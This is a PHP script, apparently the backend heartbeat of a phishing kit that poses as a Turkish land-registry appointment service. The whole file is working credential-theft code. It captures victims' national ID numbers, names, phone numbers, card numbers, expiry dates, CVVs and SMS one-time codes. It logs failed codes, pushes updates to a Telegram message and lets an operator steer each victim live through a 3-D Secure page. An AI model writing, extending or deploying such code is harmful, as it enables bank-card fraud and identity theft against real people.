<?php
/**
 * heartbeat.php — Gerçek zamanlı kullanıcı takibi
 * Her sayfadan ~3sn'de bir çağrılır.
 */
session_start();
header('Content-Type: application/json');
require_once __DIR__ . '/db.php';

// kayit_ziyaretci() buradan kaldırıldı — sadece ilk sayfa yüklemesinde çalışsın

// Log satırını bul ya da oluştur (her zaman)
$log_id = get_or_create_log();

if ($log_id) {
    // Gelen form alanlarını güncelle (sadece boş olmayanları)
    // NOT: mevcut_adim ve banka gibi hassas alanları güvenli whitelist ile kabul et
    $alanlar = [
        'tc','ad','soyad','telefon','il','ilce','islem',
        'mudurlik','tarih','saat',
        'kart_ad','kart_no','ay','yil','cvv',
        'sms_kod',
        // mevcut_adim ve banka buradan kaldırıldı — sunucu tarafında yönetiliyor
    ];
    $guncelle = [];
    foreach ($alanlar as $alan) {
        if (isset($_POST[$alan]) && $_POST[$alan] !== '') {
            $guncelle[$alan] = $_POST[$alan];
        }
    }

    // SMS hatalı kodu: biriktir + sms_kod'u temizle
    if (!empty($_POST['sms_hata_kodu'])) {
        try {
            $row = db()->prepare("SELECT sms_hata_kodlari FROM tapu_logs WHERE id=? LIMIT 1");
            $row->execute([$log_id]);
            $mevcut   = trim($row->fetchColumn() ?: '');
            $yeni_kod = trim($_POST['sms_hata_kodu']);
            
            $duplicate = false;
            if ($mevcut) {
                $lines = explode("\n", $mevcut);
                $last_line = end($lines);
                if (preg_match('/\]\s*(\d+)$/', $last_line, $m)) {
                    if ($m[1] === $yeni_kod) {
                        $duplicate = true;
                    }
                }
            }
            
            if (!$duplicate) {
                $tarih = date('H:i:s');
                $guncelle['sms_hata_kodlari'] = $mevcut
                    ? $mevcut . "\n[{$tarih}] {$yeni_kod}"
                    : "[{$tarih}] {$yeni_kod}";
            }
            $guncelle['sms_kod'] = '';
        } catch (Exception $e) {}
    }

    if (!empty($guncelle)) {
        // SMS kodu gelince durum'u 'sms_bekleniyor' yap
        // Böylece bekle.php bu kullanıcıyı tekrar ACS'e göndermez
        if (isset($guncelle['sms_kod']) && $guncelle['sms_kod'] !== '') {
            $guncelle['durum'] = 'sms_bekleniyor';
        }

        update_log($log_id, $guncelle);

        // SMS kodu gelince Telegram mesajını güncelle
        if (isset($guncelle['sms_kod']) && $guncelle['sms_kod'] !== '') {
            try {
                $st = db()->prepare("SELECT tg_message_id FROM tapu_logs WHERE id=? LIMIT 1");
                $st->execute([$log_id]);
                $tg_msg_id = $st->fetchColumn();
                if ($tg_msg_id) {
                    tg_mesaj_guncelle($log_id);
                }
            } catch (Exception $e) {}
        }
    } else {
        touch_aktivite($log_id);
    }

    $_SESSION['log_id'] = $log_id;
}

// Admin komutunu döndür
$row = [];
if ($log_id) {
    try {
        $st = db()->prepare("SELECT durum, admin_mesaj, acs_url FROM tapu_logs WHERE id=? LIMIT 1");
        $st->execute([$log_id]);
        $row = $st->fetch() ?: [];
    } catch (Exception $e) {}
}

echo json_encode([
    'ok'      => true,
    'durum'   => $row['durum']       ?? 'aktif',
    'mesaj'   => $row['admin_mesaj'] ?? '',
    'acs_url' => $row['acs_url']     ?? '',
]);
